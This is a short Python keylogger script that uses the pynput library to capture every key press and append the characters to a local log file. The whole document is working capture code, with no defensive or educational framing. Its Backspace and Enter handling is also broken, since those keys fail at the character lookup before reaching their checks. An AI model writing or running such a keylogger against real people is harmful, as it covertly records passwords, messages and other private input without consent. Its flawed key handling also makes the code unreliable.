from pynput import keyboard

def keyPressed(key):
    try:
        char = key.char
        print(str(key))
        with open("keylogfile.txt", 'a') as logKey:
            # Add a check for Backspace and Enter keys
            if key == keyboard.Key.backspace:
                logKey.write("[BACKSPACE]")
            elif key == keyboard.Key.enter:
                logKey.write("\n[ENTER]\n")
            else:
                logKey.write(char)
    except AttributeError:
        # Handle non-character keys
        print(f"Special key {key} pressed")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()

